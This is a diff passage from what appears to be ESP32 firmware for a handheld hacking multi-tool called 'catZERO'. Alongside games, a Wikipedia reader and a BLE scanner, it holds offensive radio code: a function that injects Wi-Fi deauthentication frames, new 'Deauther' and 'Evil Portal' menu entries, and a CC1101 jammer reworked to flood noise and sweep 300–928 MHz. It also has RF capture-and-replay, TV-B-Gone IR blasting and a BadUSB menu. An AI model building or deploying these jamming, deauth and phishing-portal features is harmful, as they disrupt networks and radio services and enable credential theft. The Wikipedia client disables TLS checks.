+  delayMicroseconds(10);
 }
 
-// ----------------------------------------------------------------------------
-// Wi-Fi: СКАНИРОВАНИЕ, СПЕКТР, ДЕАУТ, ПОДКЛЮЧЕНИЕ
-// ----------------------------------------------------------------------------
 void startWifiScan()
 {
     wifiScanning=true;
@@ -1117,7 +1239,6 @@ void startWifiScan()
     wifiScanning=false;
     needRedraw=true;
 }
-
 void sendDeauth() {
   WiFi.mode(WIFI_STA);
   esp_wifi_set_channel(targetChan, WIFI_SECOND_CHAN_NONE);
@@ -1132,7 +1253,6 @@ void sendDeauth() {
   for (int i = 0; i < 6; i++) deauth[10 + i] = mac[i];
   esp_wifi_80211_tx(WIFI_IF_STA, deauth, sizeof(deauth), false);
 }
-
 bool connectToWiFi(String ssid, String password) {
   if (WiFi.status() == WL_CONNECTED && WiFi.SSID() == ssid) {
     showMsg("Already connected");
@@ -1175,7 +1295,6 @@ bool connectToWiFi(String ssid, String password) {
   Serial.println("Manual connect fail");
   return false;
 }
-
 void attemptAutoConnect() {
   if (autoConnectInProgress) return;
   loadWiFiCredentials();
@@ -1225,9 +1344,6 @@ void attemptAutoConnect() {
   Serial.println("Auto-connect: no suitable network found");
 }
 
-// ----------------------------------------------------------------------------
-// TV-B-Gone (исправленный)
-// ----------------------------------------------------------------------------
 void tvbgone_send_all() {
   const int *codes;
   const unsigned short *codes2;
@@ -1304,7 +1420,6 @@ void tvbgone_send_all() {
   ledcWrite(0, 0);
   showMsg("Done");
 }
-
 void tvbgone_menu() {
   tvbgone_region = 0;
   while (true) {
@@ -1331,9 +1446,6 @@ void tvbgone_menu() {
   needRedraw = true;
 }
 
-// ----------------------------------------------------------------------------
-// ЗАСТАВКА И ИНИЦИАЛИЗАЦИЯ SD-КАРТЫ
-// ----------------------------------------------------------------------------
 const char* bootLogo[] = {
   " ####   ##   #####",
   "##  ## ####    ## ",
@@ -1341,7 +1453,6 @@ const char* bootLogo[] = {
   "##  ########   ## ",
   " ######    ##  ## "
 };
-
 void showBootLogo() {
   display.clearDisplay();
   display.setTextColor(SSD1306_WHITE);
@@ -1367,7 +1478,6 @@ void showBootLogo() {
   delay(1000);
   display.setTextSize(1);
 }
-
 void initSDCard() {
   Serial.println("Initializing SD card...");
   SPI.begin(SPI_SCK, SPI_MISO, SPI_MOSI, SD_CS_PIN);
@@ -1411,9 +1521,6 @@ void initSDCard() {
   delay(1500);
 }
 
-// ----------------------------------------------------------------------------
-// БАЗОВЫЕ ФУНКЦИИ ОТРИСОВКИ
-// ----------------------------------------------------------------------------
 void drawHeader(const char* title) {
   display.fillRect(0, 0, SCREEN_WIDTH, 12, SSD1306_BLACK);
   display.setTextColor(SSD1306_WHITE);
@@ -1421,7 +1528,6 @@ void drawHeader(const char* title) {
   display.print(title);
   display.drawLine(0, 12, SCREEN_WIDTH, 12, SSD1306_WHITE);
 }
-
 void drawItem(const char* text, bool sel, int line) {
   int y = 14 + line * 10;
   if (sel) {
@@ -1435,23 +1541,19 @@ void drawItem(const char* text, bool sel, int line) {
   display.setCursor(14, y);
   display.print(text);
 }
-
 void drawWiFiIcon(int x, int y) {
   display.fillRect(x, y, 16, 8, SSD1306_BLACK);
   display.drawBitmap(x, y, wifiIconBitmap, 16, 8, SSD1306_WHITE);
 }
-
 void drawTopBarWiFiIcon() {
   if (WiFi.status() == WL_CONNECTED) {
     drawWiFiIcon(SCREEN_WIDTH - 16, 2);
   }
 }
-
 void drawMainMenu() {
   display.clearDisplay();
   drawHeader("catZERO");
-  const char* items[] = {"WiFi", "nRF24", "IR", "Console", "BadUSB", "Settings", "CC1101", "Storage"};
-  // Увеличьте MAIN_SIZE_TOTAL до 8 и MAIN_VISIBLE, если нужно
+  const char* items[] = {"WiFi", "Bluetooth", "nRF24", "IR", "Console", "BadUSB", "Settings", "CC1101", "Storage", "Apps"};
   int start = mainScrollOffset;
   int end = start + MAIN_VISIBLE;
   if (end > MAIN_SIZE_TOTAL) end = MAIN_SIZE_TOTAL;
@@ -1471,17 +1573,286 @@ void drawMainMenu() {
   display.display();
 }
 
+void drawAppsMenu() {
+  display.clearDisplay();
+  drawHeader("Apps");
+  Serial.println("drawAppsMenu called");
+  const char* items[] = {"Calculator", "Bird", "Tetris", "Wikipedia", "Back"};
+  const int size = 5;
+  
+  for (int i = 0; i < size; i++) {
+    int y = 14 + i * 10;
+    if (i == appsMenuIdx) {
+      display.fillRect(0, y - 1, SCREEN_WIDTH, 10, SSD1306_WHITE);
+      display.setTextColor(SSD1306_BLACK);
+      display.setCursor(4, y);
+      display.print(">");
+    } else {
+      display.setTextColor(SSD1306_WHITE);
+    }
+    display.setCursor(14, y);
+    display.print(items[i]);
+  }
+  
+  drawTopBarIcons();
+  display.display();
+}
+void drawBirdGame() {
+  display.clearDisplay();
+  drawHeader("Bird");
+
+  // Обработка выхода по длительному нажатию OK (2 секунды)
+  static unsigned long okHoldStart = 0;
+  static bool okHeld = false;
+  
+  if (btnOk()) {
+    if (!okHeld) {
+      okHeld = true;
+      okHoldStart = millis();
+      // Прыжок при одиночном нажатии
+      if (!birdGameOver) birdVel = jumpPower;
+    } else {
+      // Длительное удержание -> выход в меню
+      if (millis() - okHoldStart > 2000) {
+        appState = STATE_APPS_MENU;
+        needRedraw = true;
+        okHeld = false;
+        return;
+      }
+    }
+  } else {
+    okHeld = false;
+  }
+
+  if (birdGameOver) {
+    display.setCursor(30, 30);
+    display.print("Game Over");
+    display.setCursor(20, 45);
+    display.print("Score: ");
+    display.print(birdScore);
+    display.setCursor(10, 55);
+    display.print("OK=restart, Up/Down=exit");
+    drawTopBarIcons();
+    display.display();
+    
+    if (btnOk()) {
+      // Рестарт
+      birdY = 32;
+      birdVel = 0;
+      pipes.clear();
+      birdScore = 0;
+      birdGameOver = false;
+      birdFrameCounter = 0;
+      needRedraw = true;
+    }
+    if (btnUp() || btnDown()) {
+      appState = STATE_APPS_MENU;
+      needRedraw = true;
+    }
+    return;
+  }
+
+  // Обновление физики
+  if (millis() - birdLastUpdate > 30) {
+    birdLastUpdate = millis();
+    birdVel += gravity;
+    birdY += birdVel;
+    if (birdY > 60) { birdGameOver = true; needRedraw = true; }
+    if (birdY < 0) birdY = 0;
+
+    // Трубы
+    for (int i = pipes.size() - 1; i >= 0; i--) {
+      pipes[i].x -= PIPE_SPEED;
+      if (pipes[i].x < -PIPE_WIDTH) {
+        pipes.erase(pipes.begin() + i);
+      } else {
+        if (!pipes[i].scored && pipes[i].x + PIPE_WIDTH < birdX) {
+          pipes[i].scored = true;
+          birdScore++;
+        }
+        // Столкновение
+        if (birdX + 3 > pipes[i].x && birdX - 3 < pipes[i].x + PIPE_WIDTH) {
+          int top = pipes[i].gapY - GAP_HEIGHT/2;
+          int bottom = pipes[i].gapY + GAP_HEIGHT/2;
+          if (birdY - 4 < top || birdY + 4 > bottom) {
+            birdGameOver = true;
+            needRedraw = true;
+          }
+        }
+      }
+    }
+
+    // Генерация труб
+    birdFrameCounter++;
+    if (birdFrameCounter % PIPE_INTERVAL == 0) {
+      Pipe p;
+      p.x = 128;
+      p.gapY = random(20, 44);
+      p.scored = false;
+      pipes.push_back(p);
+    }
+    needRedraw = true;
+  }
+
+  // Отрисовка
+  display.fillRect(0, 13, 128, 51, SSD1306_BLACK);
+  display.fillCircle(birdX, birdY, 4, SSD1306_WHITE);
+  for (auto &p : pipes) {
+    display.fillRect(p.x, 13, PIPE_WIDTH, p.gapY - GAP_HEIGHT/2 - 13, SSD1306_WHITE);
+    display.fillRect(p.x, p.gapY + GAP_HEIGHT/2, PIPE_WIDTH, 64 - (p.gapY + GAP_HEIGHT/2), SSD1306_WHITE);
+  }
+  display.setCursor(2, 14);
+  display.print("Score: ");
+  display.print(birdScore);
+  drawTopBarIcons();
+  display.display();
+}
+// ----------------------------------------------------------------------------
+// ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ДЛЯ ВИКИПЕДИИ
+// ----------------------------------------------------------------------------
+
+String urlEncode(String str) {
+    str.replace(" ", "%20");
+    str.replace("?", "%3F");
+    str.replace("#", "%23");
+    str.replace("%", "%25");
+    str.replace("&", "%26");
+    str.replace("=", "%3D");
+    str.replace("+", "%2B");
+    return str;
+}
+
+String fetchWikipedia(String query) {
+    if (WiFi.status() != WL_CONNECTED) {
+        return "Нет подключения к Wi-Fi.";
+    }
+
+    WiFiClientSecure client;
+    client.setInsecure();
+
+    HTTPClient http;
+    http.setTimeout(30000);
+
+    query.trim();
+    String url = "https://en.wikipedia.org/w/api.php?"
+                 "action=query"
+                 "&format=json"
+                 "&prop=extracts"
+                 "&exintro"
+                 "&explaintext"
+                 "&redirects=1"
+                 "&formatversion=2"
+                 "&titles=" + urlEncode(query);
+
+    if (!http.begin(client, url)) {
+        return "Ошибка begin()";
+    }
+
+    int httpCode = http.GET();
+    if (httpCode <= 0) {
+        String err = http.errorToString(httpCode);
+        http.end();
+        return "Ошибка: " + err;
+    }
+
+    String payload = http.getString();
+    http.end();
+
+    DynamicJsonDocument doc(50000);
+    DeserializationError error = deserializeJson(doc, payload);
+    if (error) {
+        return "Ошибка JSON";
+    }
+
+    if (!doc["query"]["pages"][0]["extract"].is<String>()) {
+        return "Статья не найдена";
+    }
+
+    String text = doc["query"]["pages"][0]["extract"].as<String>();
+    if (text.length() == 0) {
+        return "Пустая статья";
+    }
+    return text;
+}
+
+void runWikipedia() {
+    // Показываем клавиатуру для ввода
+    String query = inputStringWithKeyboard(true, "Wikipedia query:");
+    if (query.length() == 0) {
+        // Если нажали Exit или ввод пустой
+        appState = STATE_APPS_MENU;
+        needRedraw = true;
+        return;
+    }
+    showMsg("Searching...");
+    wikipediaResultText = fetchWikipedia(query);
+
+    // Разбиваем результат на строки для прокрутки
+    wikipediaLineCount = 0;
+    String remaining = wikipediaResultText;
+    while (remaining.length() > 0 && wikipediaLineCount < 50) {
+        // Берём строку до переноса или до конца экрана
+        int newline = remaining.indexOf('\n');
+        if (newline != -1) {
+            wikipediaLines[wikipediaLineCount++] = remaining.substring(0, newline);
+            remaining = remaining.substring(newline + 1);
+        } else {
+            // Если нет перевода строки, разбиваем по ширине экрана
+            // Просто загоняем всю оставшуюся строку (упрощённо)
+            wikipediaLines[wikipediaLineCount++] = remaining;
+            remaining = "";
+        }
+    }
+    wikipediaScrollOffset = 0;
+    appState = STATE_APPS_WIKIPEDIA_RESULT;
+    needRedraw = true;
+}
+void drawWikipediaResult() {
+    display.clearDisplay();
+    drawHeader("Wikipedia");
+
+    display.setTextSize(1);
+    display.setTextColor(SSD1306_WHITE);
+
+    int startLine = 0;
+    int endLine = 0;
+    int lineHeight = 10;
+    int maxLines = (SCREEN_HEIGHT - 14) / lineHeight; // оставляем место для подписи
+
+    // Показываем только видимые строки
+    for (int i = wikipediaScrollOffset; i < min(wikipediaScrollOffset + maxLines, wikipediaLineCount); i++) {
+        int y = 14 + (i - wikipediaScrollOffset) * lineHeight;
+        display.setCursor(2, y);
+        display.println(wikipediaLines[i]);
+    }
+
+    // Если строк больше, чем помещается, показываем индикатор прокрутки
+    if (wikipediaLineCount > maxLines) {
+        // Процент прокрутки
+        int percent = (wikipediaScrollOffset * 100) / (wikipediaLineCount - maxLines + 1);
+        display.fillRect(SCREEN_WIDTH - 6, 14 + (percent * (SCREEN_HEIGHT - 14 - 10) / 100), 4, 8, SSD1306_WHITE);
+    }
+
+    display.setCursor(2, SCREEN_HEIGHT - 10);
+    display.print("UP/DOWN scroll  OK=back");
+    drawTopBarIcons();
+    display.display();
+}
+
+
+
+
+
 void drawWifiMenu() {
   display.clearDisplay();
   drawHeader("WiFi");
-  const char* items[] = {"Scan", "Spectrum", "WiFi Chat", "Back"};
+  const char* items[] = {"Scan", "Spectrum", "WiFi Chat", "Deauther", "Evil Portal", "Back"};
   for (int i = 0; i < WIFI_MENU_SIZE; i++) {
     drawItem(items[i], i == wifiMenuIdx, i);
   }
   drawTopBarIcons();
   display.display();
 }
-
 void drawWifiActions() {
   display.clearDisplay();
   drawHeader("Actions");
@@ -1498,7 +1869,6 @@ void drawWifiActions() {
   drawTopBarIcons();
   display.display();
 }
-
 void drawWifiChat() {
   display.clearDisplay();
   drawHeader("WiFi Chat");
@@ -1559,7 +1929,6 @@ void drawWifiChat() {
   }
   display.display();
 }
-
 void drawNrfMenu() {
   display.clearDisplay();
   char buf[30];
@@ -1572,7 +1941,6 @@ void drawNrfMenu() {
   drawTopBarIcons();
   display.display();
 }
-
 void drawIrMenu() {
   display.clearDisplay();
   drawHeader("IR");
@@ -1583,7 +1951,6 @@ void drawIrMenu() {
   drawTopBarIcons();
   display.display();
 }
-
 void drawSettingsMenu() {
   display.clearDisplay();
   drawHeader("Settings");
@@ -1594,26 +1961,24 @@ void drawSettingsMenu() {
   drawTopBarIcons();
   display.display();
 }
-
 void drawSysInfo() {
   display.clearDisplay();
   drawHeader("System Info");
   display.setCursor(2, 14);
-  display.printf("Chip: ESP32");
+  display.print("Chip: ESP32");
   display.setCursor(2, 24);
-  display.printf("Flash: %d MB", ESP.getFlashChipSize() / 1048576);
+  display.print("Flash: " + String(ESP.getFlashChipSize() / 1048576) + " MB");
   display.setCursor(2, 34);
-  display.printf("Heap: %d KB", ESP.getFreeHeap() / 1024);
+  display.print("Heap: " + String(ESP.getFreeHeap() / 1024) + " KB");
   display.setCursor(2, 44);
-  display.printf("Uptime: %ds", (millis() - deviceBootTime) / 1000);
+  display.print("Uptime: " + String((millis() - deviceBootTime) / 1000) + "s");
   display.setCursor(2, 54);
-  display.printf("nRF24: %s", nrfOk ? "OK" : "FAIL");
+  display.print("nRF24: " + String(nrfOk ? "OK" : "FAIL"));
   display.setCursor(2, 60);
-  display.println("Press=back");
+  display.print("Press=back");
   drawTopBarIcons();
   display.display();
 }
-
 void drawTvbgone() {
   display.clearDisplay();
   drawHeader("TV-B-Gone");
@@ -1629,7 +1994,6 @@ void drawTvbgone() {
   drawTopBarIcons();
   display.display();
 }
-
 void drawCc1101Menu() {
   display.clearDisplay();
   drawHeader("CC1101");
@@ -1649,9 +2013,6 @@ void drawCc1101Menu() {
   display.display();
 }
 
-// ----------------------------------------------------------------------------
-// КОНСОЛЬНЫЕ ФУНКЦИИ
-// ----------------------------------------------------------------------------
 String inputStringWithKeyboard(bool allowExit, const char* title) {
   String result = "";
   int localSelected = 0;
@@ -1759,7 +2120,6 @@ String inputStringWithKeyboard(bool allowExit, const char* title) {
     delay(20);
   }
 }
-
 void showCommandOutput(String output, int timeoutSeconds) {
   commandOutput = output;
   commandStartTime = millis();
@@ -1768,7 +2128,6 @@ void showCommandOutput(String output, int timeoutSeconds) {
   appState = STATE_CONSOLE_COMMAND_OUTPUT;
   needRedraw = true;
 }
-
 void executeCommand(String cmd) {
   cmd.toLowerCase();
   if (cmd == CMD_INFO) {
@@ -1894,13 +2253,12 @@ void drawCc1101SpectrumVert() {
   display.drawLine(0, 50, 127, 50, SSD1306_WHITE);
   float freq = 300.0 + cc1101_current_channel;
   display.setCursor(2, 54);
-  display.printf("CH:%d  %.1fMHz", cc1101_current_channel, freq);
+  display.print("CH:" + String(cc1101_current_channel) + "  " + String(freq,1) + "MHz");
   display.setCursor(70, 54);
-  display.printf("RSSI:%d", ELECHOUSE_cc1101.getRssi());
+  display.print("RSSI:" + String(ELECHOUSE_cc1101.getRssi()));
   drawTopBarIcons();
   display.display();
 }
-
 void drawCc1101SpectrumHoriz() {
   display.clearDisplay();
   drawHeader("CC1101 Spectrum H");
@@ -1919,30 +2277,28 @@ void drawCc1101SpectrumHoriz() {
   drawTopBarIcons();
   display.display();
 }
-
 void drawCc1101Jammer() {
-  display.clearDisplay();
-  drawHeader("CC1101 Jammer");
-  if (cc1101_jamming) {
-    display.setTextSize(2);
-    display.setCursor(20, 25);
-    display.println("JAMMING");
-    display.setTextSize(1);
-    display.setCursor(10, 45);
-    display.printf("Freq: %d MHz", cc1101_jam_freq);
-    display.setCursor(2, 58);
-    display.print("OK to stop");
-  } else {
-    display.setCursor(15, 30);
-    display.print("Stopped");
-  }
-  display.setCursor(2, 55);
-  if (cc1101_jammer_mode == 0) display.print("Mode: Noise");
-  else display.print("Mode: Copy");
-  drawTopBarIcons();
-  display.display();
+    display.clearDisplay();
+    drawHeader("CC1101 Jammer");
+    if (cc1101_jamming) {
+        display.setTextSize(2);
+        display.setCursor(20, 25);
+        display.println("JAMMING");
+        display.setTextSize(1);
+        display.setCursor(10, 45);
+        display.print("Freq: ");
+        display.print(cc1101_jam_freq, 2);
+        display.print(" MHz");
+        if (cc1101_jammer_mode == 1) display.print(" SWEEP");
+        display.setCursor(2, 58);
+        display.print("OK to stop");
+    } else {
+        display.setCursor(15, 30);
+        display.print("Stopped");
+    }
+    drawTopBarIcons();
+    display.display();
 }
-
 void drawCc1101Capture() {
   display.clearDisplay();
   drawHeader("CC1101 Capture");
@@ -1950,18 +2306,17 @@ void drawCc1101Capture() {
     display.setCursor(10, 25);
     display.print("Capturing...");
     display.setCursor(10, 35);
-    display.printf("Len: %d bytes", cc1101_capture_len);
+    display.print("Len: " + String(cc1101_capture_len) + " bytes");
     display.setCursor(2, 56);
     display.print("Press OK to stop");
   }
   if (cc1101_capture_len > 0) {
     display.setCursor(10, 40);
-    display.printf("Saved: %d bytes", cc1101_capture_len);
+    display.print("Saved: " + String(cc1101_capture_len) + " bytes");
   }
   drawTopBarIcons();
   display.display();
 }
-
 void drawCc1101Transmit() {
   display.clearDisplay();
   drawHeader("CC1101 Transmit");
@@ -1969,7 +2324,7 @@ void drawCc1101Transmit() {
     display.setCursor(10, 25);
     display.print("Transmitting...");
     display.setCursor(10, 35);
-    display.printf("Sent: %d / %d", cc1101_tx_index, cc1101_tx_len);
+    display.print("Sent: " + String(cc1101_tx_index) + " / " + String(cc1101_tx_len));
     display.setCursor(2, 56);
     display.print("Press OK to stop");
   } else {
@@ -1977,7 +2332,7 @@ void drawCc1101Transmit() {
     display.print("Ready");
     if (cc1101_tx_len > 0) {
       display.setCursor(10, 35);
-      display.printf("Loaded: %d bytes", cc1101_tx_len);
+      display.print("Loaded: " + String(cc1101_tx_len) + " bytes");
       display.setCursor(10, 45);
       display.print("OK to start");
     } else {
@@ -1988,9 +2343,7 @@ void drawCc1101Transmit() {
   drawTopBarIcons();
   display.display();
 }
-// ----------------------------------------------------------------------------
-// BadUSB меню
-// ----------------------------------------------------------------------------
+
 void drawBadUsbMenu() {
     display.clearDisplay();
     drawHeader("BadUSB");
@@ -2001,14 +2354,11 @@ void drawBadUsbMenu() {
     drawTopBarIcons();
     display.display();
 }
-
-// ====== BadUSB: встроенные скрипты ======
 void drawBadUsbBuiltin() {
     display.clearDisplay();
     drawHeader("Built-in Scripts");
-
     int visible = 4;
-    int total = badUsbBuiltinCount + 1; // +1 для Back
+    int total = badUsbBuiltinCount + 1;
     int offset = 0;
     if (badUsbBuiltinIdx >= visible) offset = badUsbBuiltinIdx - visible + 1;
     if (offset < 0) offset = 0;
@@ -2026,8 +2376,6 @@ void drawBadUsbBuiltin() {
         }
         drawItem(label, idx == badUsbBuiltinIdx, i);
     }
-
-    // Индикатор прокрутки
     display.setCursor(2, 56);
     if (offset > 0) display.print("▲ ");
     else display.print("  ");
@@ -2036,12 +2384,9 @@ void drawBadUsbBuiltin() {
     display.print(total);
     if (offset + visible < total) display.print(" ▼");
     else display.print("  ");
-
     drawTopBarIcons();
     display.display();
 }
-
-// ====== BadUSB: скрипты с SD ======
 void drawBadUsbSd() {
     display.clearDisplay();
     drawHeader("SD Scripts");
@@ -2062,17 +2407,10 @@ void drawBadUsbSd() {
             }
             root.close();
         }
-        if (badUsbFileList.empty()) {
-            display.setCursor(10, 30);
-            display.print("No scripts found");
-            drawTopBarIcons();
-            display.display();
-            return;
-        }
     }
 
+    int total = badUsbFileList.size() + 1;
     int visible = 4;
-    int total = badUsbFileList.size() + 1; // +1 для Back
     int offset = 0;
     if (badUsbFileIdx >= visible) offset = badUsbFileIdx - visible + 1;
     if (offset < 0) offset = 0;
@@ -2083,7 +2421,7 @@ void drawBadUsbSd() {
         int idx = offset + i;
         if (idx >= total) break;
         const char* label;
-        if (idx == badUsbFileList.size()) {
+        if (idx == (int)badUsbFileList.size()) {
             label = "Back";
         } else {
             label = badUsbFileList[idx].c_str();
@@ -2091,7 +2429,11 @@ void drawBadUsbSd() {
         drawItem(label, idx == badUsbFileIdx, i);
     }
 
-    // Индикатор прокрутки
+    if (badUsbFileList.empty()) {
+        display.setCursor(10, 30);
+        display.print("No scripts found");
+    }
+
     display.setCursor(2, 56);
     if (offset > 0) display.print("▲ ");
     else display.print("  ");
@@ -2104,127 +2446,239 @@ void drawBadUsbSd() {
     drawTopBarIcons();
     display.display();
 }
+
+void drawBluetoothMenu() {
+    display.clearDisplay();
+    drawHeader("Bluetooth");
+    const char* items[] = {"Scan", "Back"};
+    for (int i = 0; i < 2; i++) {
+        drawItem(items[i], i == bluetoothMenuIdx, i);
+    }
+    drawTopBarIcons();
+    display.display();
+}
+void drawBluetoothScan() {
+    display.clearDisplay();
+    drawHeader("BLE Scan");
+
+    if (bleScanning) {
+        display.setCursor(40, 30);
+        display.println("Scanning...");
+        drawTopBarIcons();
+        display.display();
+        return;
+    }
+
+    int total = bleDevices.size() + 1;
+    int visible = 4;
+    int offset = 0;
+    if (bleSelectedIdx >= visible) offset = bleSelectedIdx - visible + 1;
+    if (offset < 0) offset = 0;
+    if (offset + visible > total) offset = total - visible;
+    if (offset < 0) offset = 0;
+
+    for (int i = 0; i < visible && offset + i < total; i++) {
+        int idx = offset + i;
+        int y = 14 + i * 12;
+        if (bleSelectedIdx == idx) {
+            display.fillRect(0, y - 1, SCREEN_WIDTH, 11, SSD1306_WHITE);
+            display.setTextColor(SSD1306_BLACK);
+            display.setCursor(2, y);
+            display.print(">");
+        } else {
+            display.setTextColor(SSD1306_WHITE);
+        }
+        if (idx == (int)bleDevices.size()) {
+            display.setCursor(12, y);
+            display.print("Back");
+        } else {
+            String name = bleDevices[idx].name;
+            if (name.length() == 0) name = "<Unknown>";
+            String rssiStr = " " + String(bleDevices[idx].rssi) + "dBm";
+            if (name.length() > 12) name = name.substring(0, 12) + ".";
+            display.setCursor(12, y);
+            display.print(name);
+            display.setCursor(90, y);
+            display.print(rssiStr);
+        }
+    }
+
+    display.setCursor(2, 56);
+    if (bleDevices.empty()) display.print("No devices");
+    else {
+        display.print(bleSelectedIdx + 1);
+        display.print("/");
+        display.print(total);
+    }
+
+    drawTopBarIcons();
+    display.display();
+}
+void startBleScan() {
+    if (bleScanning) return;
+    bleDevices.clear();
+    bleSelectedIdx = 0;
+    bleScrollOffset = 0;
+    bleScanning = true;
+    bleScanStart = millis();
+    showMsg("Scanning...");
+    BLEScan* pBLEScan = BLEDevice::getScan();
+    pBLEScan->setActiveScan(true);
+    pBLEScan->setInterval(100);
+    pBLEScan->setWindow(99);
+}
+void stopBleScan() {
+    bleScanning = false;
+    BLEDevice::getScan()->clearResults();
+}
+void updateBluetoothMenu(Button btn) {
+    const int sz = 2;
+    if (btn == BTN_UP) bluetoothMenuIdx = (bluetoothMenuIdx - 1 + sz) % sz;
+    else if (btn == BTN_DOWN) bluetoothMenuIdx = (bluetoothMenuIdx + 1) % sz;
+    else if (btn == BTN_OK) {
+        if (bluetoothMenuIdx == 0) {
+            showMsg("Scanning Bluetooth...");
+        } else {
+            appState = STATE_MAIN_MENU;
+        }
+        needRedraw = true;
+    }
+}
 void updateCc1101Spectrum() {
-  if (!cc1101_ok) return;
-  if (millis() - cc1101_last_update < 20) return;
-  cc1101_last_update = millis();
-  int rssi = ELECHOUSE_cc1101.getRssi();
-  int level = map(rssi, -110, -30, 0, 100);
-  if (level < 0) level = 0;
-  if (level > 100) level = 100;
-  for (int i = 0; i < 127; i++) {
-    cc1101_spectrum_vert[i] = cc1101_spectrum_vert[i+1];
-  }
-  cc1101_spectrum_vert[127] = level;
-  cc1101_spectrum_horiz[cc1101_current_channel] = level;
-  cc1101_current_channel++;
-  if (cc1101_current_channel >= 128) cc1101_current_channel = 0;
-  float freq = 300.0 + cc1101_current_channel;
-  ELECHOUSE_cc1101.setMHZ(freq);
-}
+    if (!cc1101_ok) return;
+    static unsigned long lastSwitch = 0;
+    // 500 мкс на перестройку – достаточно для CC1101
+    if (micros() - lastSwitch < 500) return;
+    lastSwitch = micros();
 
+    cc1101_current_channel++;
+    if (cc1101_current_channel >= 128) cc1101_current_channel = 0;
+    float freq = 300.0 + cc1101_current_channel;
+    ELECHOUSE_cc1101.setMHZ(freq);
+
+    int rssi = ELECHOUSE_cc1101.getRssi();
+    int level = map(rssi, -110, -30, 0, 100);
+    if (level < 0) level = 0;
+    if (level > 100) level = 100;
+
+    cc1101_spectrum_vert[cc1101_current_channel] = level;
+    cc1101_spectrum_horiz[cc1101_current_channel] = level;
+}
 void startCc1101Jammer() {
-  if (!cc1101_ok) return;
-  cc1101_jamming = true;
-  cc1101_jam_last_time = millis();
-  ELECHOUSE_cc1101.SetTx();
-  ELECHOUSE_cc1101.setPA(10);
-  showMsg("CC1101 Jammer ON");
+    if (!cc1101_ok) return;
+    cc1101_jamming = true;
+    cc1101_jam_freq = 433.92; // начальная частота
+    ELECHOUSE_cc1101.SetTx();
+    ELECHOUSE_cc1101.setPA(12);
+    ELECHOUSE_cc1101.setModulation(2); // ASK/OOK
+    ELECHOUSE_cc1101.setDRate(50);
+    ELECHOUSE_cc1101.setRxBW(256);
+    showMsg("Jammer ON");
 }
-
 void stopCc1101Jammer() {
   cc1101_jamming = false;
   ELECHOUSE_cc1101.SetRx();
   showMsg("CC1101 Jammer OFF");
 }
-
 void updateCc1101Jammer() {
-  if (!cc1101_jamming) return;
-  if (millis() - cc1101_jam_last_time < 2) return;
-  cc1101_jam_last_time = millis();
-  if (cc1101_jammer_mode == 0) {
-    ELECHOUSE_cc1101.SendData(jamNoise, 32);
-    delayMicroseconds(100);
-  } else {
-    if (cc1101_capture_len > 0) {
-      int bytesSent = 0;
-      while (bytesSent < cc1101_capture_len) {
-        int chunk = min(32, cc1101_capture_len - bytesSent);
-        ELECHOUSE_cc1101.SendData(cc1101_capture_buffer + bytesSent, chunk);
-        bytesSent += chunk;
-        delayMicroseconds(100);
-        yield();
-      }
-    } else {
-      ELECHOUSE_cc1101.SendData(jamNoise, 32);
+    if (!cc1101_jamming) return;
+
+    // Отправляем сразу 8 пакетов без задержки между ними
+    byte noise[8] = {0xFF, 0xAA, 0x55, 0x00, 0xAA, 0xFF, 0x55, 0x00};
+    for (int i = 0; i < 8; i++) {
+        ELECHOUSE_cc1101.SendData(noise, 8);
+        // delayMicroseconds(50) убран – это ускоряет цикл
     }
-  }
-  cc1101_jam_freq += CC1101_JAM_FREQ_STEP;
-  if (cc1101_jam_freq > CC1101_JAM_FREQ_END) cc1101_jam_freq = CC1101_JAM_FREQ_START;
-  ELECHOUSE_cc1101.setMHZ(cc1101_jam_freq);
-}
 
+    // Если включён sweep, переключаем частоту
+    if (cc1101_jammer_mode == 1) {
+        cc1101_jam_freq += 0.05;
+        if (cc1101_jam_freq > 928.0) cc1101_jam_freq = 300.0;
+        ELECHOUSE_cc1101.setMHZ(cc1101_jam_freq);
+    }
+    cc1101_jam_last_time = millis();
+}
 void cc1101_capture_start() {
-  cc1101_capturing = true;
-  cc1101_capture_len = 0;
-  cc1101_capture_start_time = millis();
-  ELECHOUSE_cc1101.SetRx();
-  showMsg("Capture started");
+    if (!cc1101_ok) return;
+    cc1101_capturing = true;
+    cc1101_capture_len = 0;
+    cc1101_capture_start_time = millis();
+    ELECHOUSE_cc1101.SetRx();
+    // Настройка для приёма ASK/OOK
+    ELECHOUSE_cc1101.setModulation(2);
+    ELECHOUSE_cc1101.setDRate(50);
+    ELECHOUSE_cc1101.setRxBW(256);
+    showMsg("Capturing...");
 }
-
 void cc1101_capture_stop() {
-  cc1101_capturing = false;
-  showMsg("Capture stopped");
+    cc1101_capturing = false;
+    ELECHOUSE_cc1101.setSidle();
+    showMsg("Capture stopped");
+    // Если есть данные, предложить сохранить
+    if (cc1101_capture_len > 0) {
+        display.clearDisplay();
+        drawHeader("Capture");
+        display.setCursor(10, 25);
+        display.print("Captured ");
+        display.print(cc1101_capture_len);
+        display.println(" bytes");
+        display.setCursor(10, 40);
+        display.println("OK to save");
+        display.setCursor(10, 50);
+        display.println("ESC to discard");
+        drawTopBarIcons();
+        display.display();
+        while (true) {
+            if (btnOk()) {
+                // Сохраняем в файл (используем вашу функцию сохранения)
+                saveWiFiCredentials("rf_capture", String(cc1101_capture_len));
+                showMsg("Saved");
+                break;
+            }
+            if (btnUp() || btnDown()) {
+                cc1101_capture_len = 0;
+                showMsg("Discarded");
+                break;
+            }
+            delay(50);
+        }
+    }
 }
-
 void cc1101_transmit_start() {
-  if (cc1101_tx_len == 0) {
-    showMsg("Nothing to transmit");
-    return;
-  }
-  cc1101_transmitting = true;
-  cc1101_tx_index = 0;
-  cc1101_tx_next_time = 0;
-  ELECHOUSE_cc1101.SetTx();
-  showMsg("Transmitting...");
+    if (cc1101_tx_len == 0) {
+        showMsg("Nothing to transmit");
+        return;
+    }
+    ELECHOUSE_cc1101.SetTx();
+    ELECHOUSE_cc1101.setPA(12);
+    ELECHOUSE_cc1101.setModulation(2);
+    ELECHOUSE_cc1101.setDRate(50);
+    ELECHOUSE_cc1101.setRxBW(256);
+    cc1101_transmitting = true;
+    cc1101_tx_index = 0;
+    cc1101_tx_next_time = micros();
+    showMsg("Transmitting...");
 }
-
 void cc1101_transmit_stop() {
-  cc1101_transmitting = false;
-  ELECHOUSE_cc1101.SetRx();
-  showMsg("Transmission stopped");
+    cc1101_transmitting = false;
+    ELECHOUSE_cc1101.setSidle();
+    showMsg("Transmission stopped");
+}
+void cc1101_transmit_loop() {
+    if (!cc1101_transmitting) return;
